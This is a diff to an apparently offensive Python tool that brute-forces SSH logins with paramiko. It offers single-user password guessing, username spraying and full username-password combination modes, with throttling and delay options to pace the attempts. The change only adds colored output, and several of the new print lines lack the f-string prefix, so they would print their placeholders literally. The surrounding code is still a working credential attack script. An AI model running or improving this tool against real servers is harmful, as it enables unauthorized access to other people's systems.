@@ -3,6 +3,12 @@ import argparse
 import time
 import sys
 
+# ANSI colors
+GREEN = "\033[92m"
+RED = "\033[91m"
+YELLOW = "\033[93m"
+RESET = "\033[0m"
+
 #Attempt SSH login
 def try_ssh_login(host, port, username, password):
     ssh = paramiko.SSHClient()
@@ -14,15 +20,15 @@ def try_ssh_login(host, port, username, password):
     except paramiko.AuthenticationException:
         return False # Login failed
     except paramiko.ssh_exception.SSHException as e:
-        print(f"SSH exception: {e}")
+        print(f"{YELLOW}SSH exception: {e}")
         return False
     except Exception as e:
-        print(f" Connection error: {e}")
+        print(f"{YELLOW}Connection error: {e}")
     
 # Handles throttling (after every x attempts)
 def throttle_option(attempts, limit, sleep_time):
     if limit and attempts > 0 and attempts % limit == 0:
-        print(f" Sleeping {sleep_time} seconds after {limit} attempts...")
+        print(f"{YELLOW}Sleeping {sleep_time} seconds after {limit} attempts...")
         time.sleep(sleep_time)
     
 # Mode: targeted (1 user, many passwords)
@@ -33,10 +39,10 @@ def brute_single_user(host, port, username, password_file, limit=None, sleep_tim
             password = line.strip()
             attempts+= 1
             if try_ssh_login(host, port, username, password):
-                print("Success!: {username}:{password}")
+                print("{GREEN}Success!: {username}:{password}")
                 break
             else:
-                print(f"Failed: {username}:{password}")
+                print(f"{RED}Failed: {username}:{password}")
                 throttle_option(attempts, limit, sleep_time)
                 time.sleep(delay)
 
@@ -48,10 +54,10 @@ def spray_usernames(host, port, usernames_file, password, limit=None, sleep_time
             username = line.strip()
             attempts+= 1
             if try_ssh_login(host, port, username, password):
-                print(f" Success! {username}:{password}")
+                print(f"{GREEN}Success! {username}:{password}")
                 break
             else:
-                print(f"Failed: {username}:{password}")
+                print(f"{RED}Failed: {username}:{password}")
                 throttle_option(attempts, limit, sleep_time)
                 time.sleep(delay)
 
@@ -67,10 +73,10 @@ def brute_user_pass(host, port, usernames_file, passwords_file, limit=None, slee
         for password in passwords:
             attempts += 1
             if try_ssh_login(host, port, user, password):
-                print(f"Success!: {user}:{password}")
+                print(f"{GREEN}Success!: {user}:{password}")
                 return # Stop on first success
             else:
-                print(f"Failed: {user}:{password}")
+                print(f"{RED}Failed: {user}:{password}")
                 throttle_option(attempts, limit, sleep_time)
                 time.sleep(delay)
 
@@ -96,21 +102,22 @@ def main():
 
     args = parser.parse_args()
 
+    # arg parsing for the individual modes
     if args.mode == "targeted":
         if not args.username or not args.passfile:
-            print("'targeted' mode requires --username and --passfile")
+            print("{YELLOW}'targeted' mode requires --username and --passfile")
             sys.exit(1)
         brute_single_user(args.host, args.port, args.username, args.passfile, args.limit, args.sleep, args.delay)
 
     elif args.mode == "spray":
         if not args.userfile or not args.password:
-            print("'spray' mode requires --userfile and --password")
+            print("{YELLOW}'spray' mode requires --userfile and --password")
             sys.exit(1)
         spray_usernames(args.host, args.port, args.userfile, args.password, args.limit, args.sleep, args.delay)
 
     elif args.mode == "broadside":
         if not args.userfile or not args.passfile:
-            print("'full' mode requires --userfile and --passfile")
+            print("{YELLOW}'full' mode requires --userfile and --passfile")
             sys.exit(1)
         brute_user_pass(args.host, args.port, args.userfile, args.passfile, args.limit, args.sleep, args.delay)
 
